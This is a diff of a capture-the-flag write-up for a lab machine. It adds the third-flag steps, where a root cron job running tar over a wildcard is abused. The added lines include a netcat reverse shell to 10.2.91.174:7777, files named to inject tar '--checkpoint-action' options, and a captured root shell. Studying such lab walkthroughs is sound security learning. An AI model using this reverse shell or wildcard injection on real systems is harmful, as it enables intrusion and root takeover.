@@ -1,4 +1,3 @@
-WIP
 #### Flag 1
 - I stared with a basic nmap scan on the top 1000 ports `nmap -sV IP -v`
 - That revealed http and ssh, so I went to the website
@@ -151,5 +150,27 @@ spooky@anonymous-playground:/home/spooky$ cat flag.txt
 ```
 - Tip - if your shell gets frozen bc of questionable laptop specs (like mine) CTRL+Z to suspend the python script and rerun it
 #### Flag 3
-- I don't know spooky's password, so I start by checking crontab
- 
+- I don't know spooky's password so I can't run `sudo -l`. Instead I start by checking crontab with `cat /etc/crontab`
+```
+*/1 *   * * *   root    cd /home/spooky && tar -zcf /var/backups/spooky.tgz *
+```
+- This [source](https://www.exploit-db.com/papers/33930) from exploit-db helped me find the solution
+- `shell.sh` is a simple reverse shell made with `echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.2.91.174 7777 >/tmp/f' > shell.sh`
+```
+spooky@anonymous-playground:/home/spooky$ echo "" > "--checkpoint=1"
+spooky@anonymous-playground:/home/spooky$ echo "" > "--checkpoint-action=exec=sh shell.sh"
+```
+- I set up a listener with `nc -lvnp 7777`
+```
+─$ nc -lvnp 7777         
+listening on [any] 7777 ...
+connect to [10.2.91.174] from (UNKNOWN) [10.10.51.244] 60660
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# cd /root
+# ls
+flag.txt
+# cat flag.txt
+```
+
